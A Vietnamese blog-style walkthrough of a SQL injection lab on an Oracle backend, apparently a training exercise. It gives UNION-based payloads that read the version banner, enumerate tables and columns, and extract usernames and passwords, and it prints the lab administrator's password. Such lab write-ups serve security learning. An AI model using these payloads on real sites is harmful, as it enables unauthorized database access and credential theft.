Lại là Lâm đây

Xin chào các bạn đã trở lại series này hôm nay lại là bài SQLi

++ Tấn công tiêm nhiễm SQL, liệt kê nội dung cơ sở dữ liệu trên Oracle vẫn là Oracle bắt đầu nào
![Alt text](image-13.png)
Đề bài yêu cầu như lab5 và thay vì Potgres thì bây giờ là Oracle

 Giao diện bây giờ sẽ là như này:
![Alt text](image-14.png)
sử dụng payload này vì Db query ra 2 cột nên cỏ vể là dùng
                                         ' UNION SELECT BANNER,NULL FROM v$version--

Vâng nó đã hoạt động ![Alt text](image-15.png)
Tiếp theo đó là list column nó ra với tất cả kiến thức của bạn:)) còn tôi thì search thôi 
![Alt text](image-16.png)
                                        filter?category=Gifts%27%20UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--
 sẽ trả ra rất nhiều table mà liên quan đến admintrator thì chỉ có user thôi theo kinh nghiệm code của tôi
 
 ![Alt text](image-17.png) có vẻ như nó đây rồi bây giờ thì việc của bạn là list colums trong table USERS_CDFZIO
 tôi sẽ sử dụng câu lệnh bypass này :
                                        ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_CDFZIO'--
![Alt text](image-18.png)
chắc chắn là đúng hướng rồi bây giờ thì lấy ra username và passwd thôi 
                                        %27%20UNION%20SELECT%20USERNAME_IYSSEC,PASSWORD_GRNRSJ%20FROM%20USERS_CDFZIO--
nó Url encode rồi nên cũng không sao bạn tự đọc nhé và thành công
![Alt text](image-19.png)
password của administrator là 69zqi08frexxhxhgos71 thực ra tôi code python brute force cũng được nhưng mà sẽ mấy mấy ngày đấy:(((
                                        chúc bạn thành công Author : l3mh0cr3d